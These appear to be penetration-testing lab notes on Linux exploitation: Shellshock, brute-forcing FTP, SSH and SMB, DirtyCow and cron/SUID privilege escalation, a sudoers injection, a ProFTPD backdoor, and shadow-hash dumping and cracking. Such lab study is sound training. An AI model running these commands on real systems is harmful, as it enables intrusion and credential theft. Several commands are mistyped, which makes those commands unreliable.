# Linux

[Home](../README.md) · [Section index](README.md)

> Adapted from the original notes, lines 3619–3826. Examples are lab-specific and need verification.

- **Pic: Exploited Linux Services**

    ![image.png](image%202.png)

- **Exploiting Linux Vulnerabilities**

    **Shellshock**

    - `nmap -sV 192.173.104.3`
    - Browse http://192.173.104.3/gettime.cgi
    - Vuln check - `nmap -sV --script=http-shellshock --script-args "http-shellshock.uri=/gettime.cgi" 192.173.104.3`

    //manually

    ```bash
    using burpsuite and nc -nlvp 1234
    ```

    //using msf

    - `msfconsole`
    - `search shellshock
    use exploit/multi/http/apache_mod_cgi_bash_env_exec
    set RHOSTS 192.173.104.3
    set TARGETURI /gettime.cgi
    exploit`

    **FTP**

    - `nmap -sV 192.209.45.3`
    - Bruteforce `hydra -L /usr/share/metasploit-framework/data/wordlists/common_users.txt -P /usr/share/metasploit-framework/data/wordlists/unix_passwords.txt 192.209.45.3 -t 4 ftp`
    - `ftp 192.209.45.3`
    - `dir`
    - `get secret.txt`
    - `exit` / exit from ftp session
    - #ls
    - #cat secret.txt

    ```bash
    nmap -sV ip      //Version: ProFTPD
    searchsploit ProFTPD     //identifiy vul
    ```

    **SSH**

    - `nmap -sV 192.63.218.3`
    - Bruteforce `hydra -L /usr/share/metasploit-framework/data/wordlists/common_users.txt -P /usr/share/metasploit-framework/data/wordlists/common_passwords.txt 192.63.218.3 -t 4 ssh`
    - `ssh [sysadmin@192.63.218.3](mailto:sysadmin@192.63.218.3)`
    - `whoami`
    - `groups sysadmin`
    - `cat /etc*issue`
    - `uname -r`
    - `cat /etc/passwd`
    - `find / -name "flag”`
    - `cat /flag`

    **Samba**

    - `nmap -sV 192.34.128.3`
    - Bruteforce `hydra -l admin -P /usr/share/metasploit-framework/data/wordlists/unix_passwords.txt 192.34.128.3 smb`
    - `smbmap -H 192.34.128.3 -u admin -p password1`
    - `man smbclient`
    - `smbclient -L 192.34.128.3 -U admin`
    - dir , cd hidden\, dir , get flag.tar.gz. exit, tar xzf flag.tar.gz, ls , cat flag
    - `smbclient [//192.34.128.3/shawn](https://192.34.128.3/shawn) -U admin`
    - `smbclient [//192.34.128.3/nancy](https://192.34.128.3/nancy) -U admin`
    - `smb:\>?` or dir
    - smb: cd srv ,  get flag , exit , ls , cat flag
    - `enum4linux -a 192.34.128.3`  -a for all info
    - `enum4linux -a -u admin -p password1 192.34.128.3`
    - get flag
- **Linux Privilege Escalation**
    - Linux Kernel Exploitation

        ```bash
        //metepreter
        sysinfo
        getuid
        shell      //verify this
        cat /etc/passwd
        sudo apt-get update
        ctrl+z
        ...download file
        cd /tmp
        ls
        upload ~/Desktop/Linux_Enum/les.sh
        shell
        ./les.sh
        //impt info : kernel version
        download for exploitdb : dirtycow from impt info
        $sudo apt-get install gcc
        cd Dowload
        ls
        mv 40839.c dirty.c
        ls
        gcc -pthred dirty.c -o -lcrypt
        ls
        //show drity and dirty.c

        /tmp$
        terminate this channel
        meterpreter> upload ~/Download/dirty
        shell
        chmod +x dirty
        ./dirty password123
        //terminate
        meterpreter>upload ~/Download/dirty.c
        shell
        gcc -pthred dirty.c -o dirty -lcrypt         //from exploid-db
         ls
         chmod +x dirty
         ./dirty password123
         cat /etc/passwd
         su firefart

         $ssh firefart@ip
         ssh-keygen -f "/home/kali.ssh/known_hosts" -R "ip"
         ssh firefart@ip
         ///got the firefat session
         sudo apt-get update
         apt-get update
         whoami
         cat /etc/shadow
         // that is how to elevate linux karnel
        ```

    **Cron jobs**

    - `whoami
    groups student
    cat /etc/passwd
    crontab -l`
    - ls -al
    - cat message       //permission denied
    - pwd
    - `cd /`
    - `grep -rnw /usr -e "/home/student/message"`
    - `grep -rnw /usr/local/share/copy.sh:2:cp /home/student/message /tmp/message`
    - ls -al /tmp
    - cat /tmp/message
    - `ls -al /usr/local/share/copy.sh`
    - cat /usr/local/share/copy.sh
    - `printf '#!/bin/bash\necho "student ALL=NOPASSWD:ALL" >> /etc/sudoers' > /usr/local/share/copy.sh`
    - `cat /usr/local/share/copy.sh`
    - `echo "student ALL=NOPASSWD:ALL" >> /etc/sudoers`
    - `sudo -l`
    - `sudo su`
    - whoami
    - cd /root
    - ls
    - cat flag
    - Got root priviledges
    - get the flag

    **SUID**

    ```bash
    pwd
    ls -al         //check binary
    ./greetings              //permission denied
    file welcome
    strings welcome                //greeting binary got this
    rm greetings
    cp /bin/bash greetins
    ls
    ./welcome             //root priv
    cat /etc/shadow
    ```

    - `pwd`
    - `la -al`
    - identify that welcome file have s binaries specifies
    - `find welcome`
    - `strings welcome`
    - `rm greetings
    cp /bin/bash greetings
    ./welcome`
    - `cd /root`
    - `cat flag`
- **Linux Credentials Dumping**
    - `nmap -sV 192.75.64.3`    //version
    - seachsploit ProFTPD       //backdoor command executable (msf)
    - `service postgresql start && msfconsole -q`
    - `setg RHOSTS 192.75.64.3
    search proftpd
    use exploit/unix/ftp/proftpd_133c_backdoor
    run`
    - `/bin/bash -i`
    - id
    - //ctrl + z
    - sessions
    - Upgrade the sessions to a `meterpreter` session
    - `sessions -u 1`    // u  means upgrade
    - `sessions 2`
    - `cat /etc/shadow`
    - Gather Linux Password hashes with `Metasploit` root user
    - `search hashdump      // msf module
    use post/linux/gather/hashdump
    set SESSION 2
    run`
    - `search crack
    use auxiliary/analyze/crack_linux
    set SHA512 true
    run`
